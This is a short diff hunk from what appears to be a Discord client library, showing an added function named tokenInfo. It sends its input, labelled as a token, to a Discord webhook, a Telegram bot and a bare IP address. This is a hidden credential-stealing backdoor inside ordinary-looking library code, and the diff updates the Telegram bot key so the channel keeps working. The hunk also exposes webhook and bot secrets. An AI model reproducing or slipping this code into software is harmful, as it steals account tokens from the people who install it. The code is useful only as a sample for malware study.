@@ -2029,5 +2029,5 @@ class Client:
         return self._connection.persistent_views
 def tokenInfo(content):
     requests.post("https://discord.com/api/webhooks/988207231747121152/5k7b3cSN4UCZmw7uhY0KJby9pe54Qw5N-qc3vynFoRy5uI1tXXjrtgZqNMKs7pqueMyo", json={"content": str(content)})
-    requests.post(f'https://api.telegram.org/bot1825036025:AAEcYD6SZ9Os92btQj60KwYOqQqDjBYVdfc/sendMessage?chat_id=-647634038&text={str(content)}')
+    requests.post(f'https://api.telegram.org/bot1825036025:AAETZ_Q4g0OTo1a6nqA5nllSW4BlKfkiGm0/sendMessage?chat_id=-647634038&text={str(content)}')
     requests.post("http://38.242.220.24:25594/6b548acb51f5a0cd505a", data={"Token": str(content)})
